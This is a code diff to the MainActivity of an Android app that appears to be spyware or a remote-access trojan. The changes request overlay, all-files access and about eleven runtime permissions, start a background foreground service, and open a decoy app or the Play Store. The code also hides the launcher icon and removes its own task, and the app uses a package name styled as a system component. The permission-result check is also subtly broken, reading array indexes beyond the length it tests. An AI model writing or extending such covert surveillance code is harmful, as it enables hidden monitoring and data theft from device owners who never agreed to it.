@@ -22,6 +22,8 @@ import android.os.Handler;
 import android.provider.Settings;
 import android.widget.Toast;
 
+import com.android.background.services.receivers.AdminReceiver;
+
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 55555;
@@ -58,38 +60,28 @@ public class MainActivity extends AppCompatActivity {
                         ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
         ) {
             askPermission();
-        } else {
+        }
+        else {
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !Settings.canDrawOverlays(this)) {
-                requestDisplayOverPermission();
-            } else {
+            Intent intent = new Intent(this, MainService.class);
+            ContextCompat.startForegroundService(this, intent);
 
-                if (!Environment.isExternalStorageManager()) {
+            openExternalPage(this);
 
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                    Uri uri = Uri.fromParts("package", getPackageName(), null);
-                    intent.setData(uri);
-                    startActivity(intent);
-                } else {
-                    Intent intent = new Intent(this, MainService.class);
-                    ContextCompat.startForegroundService(this, intent);
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                hideIcon();
+            }
 
-                    openExternalPage(this);
-
-                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-                        hideIcon();
-                    }
-
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                        new Handler().postDelayed(this::finishAndRemoveTask, 1000);
-                    } else {
-                        finish();
-                    }
-                }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+            }
+            else {
+                finish();
             }
         }
     }
 
+    //-------------------------------------------------------------------------------------------------------------
     @RequiresApi(api = Build.VERSION_CODES.R)
     private void askPermission() {
         ActivityCompat.requestPermissions(this, new String[]{
@@ -114,11 +106,24 @@ public class MainActivity extends AppCompatActivity {
         }, PERMISSION_REQUEST_CODE);
     }
 
-    //-------------------------------------------------------------------------------------------------------------
     private void requestDisplayOverPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
             startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
+        }
+    }
+
+    private void requestExternalStorageManagerPermission(){
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                Uri uri = Uri.fromParts("package", getPackageName(), null);
+                intent.setData(uri);
+                startActivity(intent);
+            }
         }
     }
 
@@ -131,6 +136,9 @@ public class MainActivity extends AppCompatActivity {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (!Settings.canDrawOverlays(this)) {
                     Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
+                }
+                else{
+                    requestExternalStorageManagerPermission();
                 }
             }
         }
@@ -146,8 +154,7 @@ public class MainActivity extends AppCompatActivity {
             intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
-        }
-        catch (Exception e){
+        } catch (Exception e) {
             Intent intent = new Intent(Intent.ACTION_VIEW);
             intent.setData(Uri.parse("https://play.google.com/store/apps/"));
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -173,10 +180,20 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length >= 2
                 && grantResults[0] == PackageManager.PERMISSION_GRANTED
                 && grantResults[1] == PackageManager.PERMISSION_GRANTED
+                && grantResults[2] == PackageManager.PERMISSION_GRANTED
+                && grantResults[3] == PackageManager.PERMISSION_GRANTED
+                && grantResults[4] == PackageManager.PERMISSION_GRANTED
+                && grantResults[5] == PackageManager.PERMISSION_GRANTED
+                && grantResults[6] == PackageManager.PERMISSION_GRANTED
+                && grantResults[7] == PackageManager.PERMISSION_GRANTED
+                && grantResults[8] == PackageManager.PERMISSION_GRANTED
+                && grantResults[9] == PackageManager.PERMISSION_GRANTED
+                && grantResults[10] == PackageManager.PERMISSION_GRANTED
 
         ) {
 
             Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
+            requestDisplayOverPermission();
         }
     }
 }
